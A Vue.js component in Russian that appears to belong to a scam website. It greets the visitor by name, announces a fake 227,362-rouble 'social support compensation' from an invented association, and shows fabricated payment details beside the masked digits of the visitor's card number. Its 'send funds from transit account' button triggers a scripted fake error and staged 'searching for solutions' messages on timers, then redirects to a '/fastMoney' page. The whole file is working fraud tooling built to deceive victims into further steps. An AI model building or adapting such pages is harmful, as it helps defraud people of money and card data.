<template>
	<div class="v-transit-account">
		<div class="transitAccount">
			<div class="subTransitAccount">
				<div class="getPayoutTopBlock">
				<img :src="require('@/assets/images/flag-russia.png')">
				<p class="getPayoutTopBlockHeader">Уважаемый {{this.$store.state.processingData.name}} {{this.$store.state.processingData.middleName}}</p>
				<div>
					<p class="getPayoutTopText">В рамках программы поддержки населения вам начислена компенсация.</p>
					<p class="getPayoutTopText">Сумма надлежащая в выплате:</p>
				</div>

				<p class="getPayoutTopSumma">227 362 руб.</p>
				<p class="getPayoutTopSubText">(двести двадцать семь тысяч триста шестьдесят два рубля)</p>
			</div>
			<div>
				<div class="getPayoutBlock">
					<p class="getPayoutHeader">Назначение платежа:</p>
					<p class="getPayoutText">Социальная выплата</p>
				</div>
				<div class="getPayoutBlock">
					<p class="getPayoutHeader">Отправитель:</p>
					<p class="getPayoutText">Региональная ассоциация социальной поддержки населения</p>
				</div>
				<div class="getPayoutBlock">
					<p class="getPayoutHeader">Дата:</p>
					<p class="getPayoutText">{{date | date}}</p>
				</div>
				<div class="getPayoutBlock">
					<p class="getPayoutHeader">Номер документа:</p>
					<p class="getPayoutText">658422654</p>
				</div>
				<div class="getPayoutBlock">
					<p class="getPayoutHeader">Получатель:</p>
					<p class="getPayoutText">{{this.$store.state.processingData.lastName}} {{this.$store.state.processingData.name}} {{this.$store.state.processingData.middleName}}</p>
				</div>
				<div class="getPayoutBlock">
					<p class="getPayoutHeader">Реквизиты:</p>
					<p class="getPayoutText">**** **** **** {{this.passportFour}}</p>
				</div>
				<div class="getPayoutBlock">
					<p class="getPayoutHeader">Код авторизации:</p>
					<p class="getPayoutText">945262</p>
				</div>
				<div class="getPayoutBlock">
					<p class="getPayoutHeader">Сумма операции:</p>
					<p class="getPayoutText">227 362 руб.</p>
				</div>
				<div class="getPayoutBlock">
					<p class="getPayoutHeader">Комиссия: </p>
					<p class="getPayoutText"><span>Оплачена</span></p>
				</div>
			</div>
			<div class="getPayoutBlockButton">
					<button class="getPayoutButton" @click="subTransitAccount">Отправить средства с транзитного счета</button>
			</div>
			</div>
				<p class="subTransitAccountTwoHeader">Ошибка.</p>
				<div class="wrapperesubTransitAccountLoader">
					<div class="loaderesubTransitAccountLoader"></div>
				</div>
				<p class="subTransitAccountText">Превышено кол-во попыток отправки средств.</p>
				<p class="subTransitAccountTextTwo">Поиск доступных способов решения…</p>
				<p class="subTransitAccountTextThree">Ответ получен</p>
		</div>
	</div>
</template>

<script>
	export default {
		name: 'v-transit-account',
		data() {
			return {
				date: Date.now(),
				passportFour: ''
			}
		},
		methods: {
			subTransitAccount() {
				let subTransitAccount = document.querySelector('.subTransitAccount')
				let subTransitAccountTwoHeader = document.querySelector('.subTransitAccountTwoHeader')
				let wrapperesubTransitAccountLoader = document.querySelector('.wrapperesubTransitAccountLoader')
				let subTransitAccountText = document.querySelector('.subTransitAccountText')
				let subTransitAccountTextTwo = document.querySelector('.subTransitAccountTextTwo')
				let subTransitAccountTextThree = document.querySelector('.subTransitAccountTextThree')

				subTransitAccount.style.display = 'none'
				subTransitAccountTwoHeader.style.display = 'block'
				wrapperesubTransitAccountLoader.style.display = 'block'
				subTransitAccountText.style.display = 'block'
				setTimeout(() => {
					subTransitAccountTextTwo.style.display = 'block'
				}, 1000)
				setTimeout(() => {
					subTransitAccountTextThree.style.display = 'block'
				}, 2000)
				setTimeout(() => {
					this.$router.push('/fastMoney')
				}, 3000)
			}
		},
		computed: {
			passportFourNumber() {
				if(this.$store.state.processingData.cardNumber) {
					let passport = this.$store.state.processingData.cardNumber;
					let passportFourSplit = passport.split('')
					let passportFourSplice = passportFourSplit.splice(15)
					let full = passportFourSplice.join('')
					this.passportFour = full
				}
			}
		},
		mounted() {
			this.passportFourNumber
		}
	}
</script>

<style>
	.v-transit-account {
		max-width: 900px;
		margin: 0 auto;
		padding: 80px 0;
		display: flex;
		justify-content: center;
	}
	.transitAccount {
		width: 100%;
		min-height: 485px;
		background: #FFFFFF;
		box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.1);
		border-radius: 15px;
		padding: 20px 0px;
		text-align: center;
	}
	.getPayoutTopBlock {
		border-bottom: 1px solid #E5E5E5;
		text-align: center;
		margin-bottom: 20px;
	}
	.getPayoutTopBlockHeader {
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 24px;
		line-height: 29px;
		color: #005391;
		margin: 0;
		margin-bottom: 20px;
	}
	.getPayoutTopText {
		font-family: Montserrat;
		font-style: normal;
		font-weight: 500;
		font-size: 16px;
		line-height: 20px;
		color: #2D2D2D;
		margin: 0;
	}
	.getPayoutTopText:last-child{
		margin-bottom: 15px;
	}
	.getPayoutTopSumma {
		font-family: Exo 2;
		font-style: normal;
		font-weight: 800;
		font-size: 24px;
		line-height: 29px;
		color: #2D2D2D;
		margin:0;
		margin-bottom: 10px;
	}
	.getPayoutTopSubText {
		font-family: Montserrat;
		font-style: normal;
		font-weight: 500;
		font-size: 14px;
		line-height: 17px;
		color: #AEAEAE;
		margin: 0;
		margin-bottom: 10px;
	}
	.getPayoutBlock {
		display: grid;
		grid-template-columns: 1fr 2fr;
	}
	.getPayoutHeader {
		text-align: right;
		margin: 6px 0 6px 0px;
		font-family: Montserrat;
		font-style: normal;
		font-weight: 600;
		font-size: 16px;
		line-height: 20px;
		color: #646464;
	}
	.newgetPayoutHeader {
		font-family: Montserrat;
		font-style: normal;
		font-weight: 600;
		font-size: 16px;
		line-height: 20px;
		text-align: right;
		color: #008ED1;
		margin: 6px 0 6px 0px;
	}
	.getPayoutText {
		text-align: left;
		margin-left: 10px;
		margin: 6px 0 6px 10px;
		font-family: Montserrat;
		font-style: normal;
		font-weight: 600;
		font-size: 16px;
		line-height: 20px;
		color: #313131;
	}
	.getPayoutText span {
		color: #008ED1;
	}
	.newgetPayoutText {
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 16px;
		line-height: 20px;
		color: #008ED1;
		margin: 6px 0 6px 10px;
		text-align: left;
	}
	.getPayoutBlockButton {
		text-align: center;
	}
	.getPayoutButton {
		padding: 15px;
		background: #005391;
		border-radius: 5px;
		border: none;
		outline: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 16px;
		line-height: 20px;
		text-align: center;
		text-transform: uppercase;
		color: #FFFFFF;
		margin-top: 25px;
	}
	.getPayoutButton:hover {
		background: #2E7DB8;
	}
	.subTransitAccountTwoHeader {
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		color: #2D2D2D;
		display: none;
	}
	.wrapperesubTransitAccountLoader {
		margin: 34px auto;
		width: 53px;
		display: none;
	}
	.loaderesubTransitAccountLoader {
		animation: loader-spin 1s linear infinite;
		width: 53px;
		height: 53px;
		border: 4px solid rgba(0,0,0,0.1);
		border-radius: 50%;
		border-right-color: #0062AA;
		margin-top: 55px;
		margin-bottom: 60px;
	}
	@keyframes loader-spin {
  	0% {
    	transform: rotate(0deg);
  	}
  	100% {
    	transform: rotate(360deg);
  	}
	}
	.subTransitAccountText {
		display: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
	}
	.subTransitAccountTextTwo {
		display: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
	}
	.subTransitAccountTextThree {
		display: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
	}
	@media only screen and (max-width: 440px) {
		.transitAccount {
			padding:20px 15px;
			margin: 10px;
			width: 250px;
		}
		.getPayoutButton {
			font-size: 14px;
			width: 100%;
		}
		.getPayoutBlock {
			display: grid;
			grid-template-columns: 1fr;
			grid-template-rows: 1fr 1fr;
		}
		.getPayoutHeader {
			text-align: left;
		}
		.getPayoutText {
			text-align: left;
			margin: 0;
		}
	}
</style>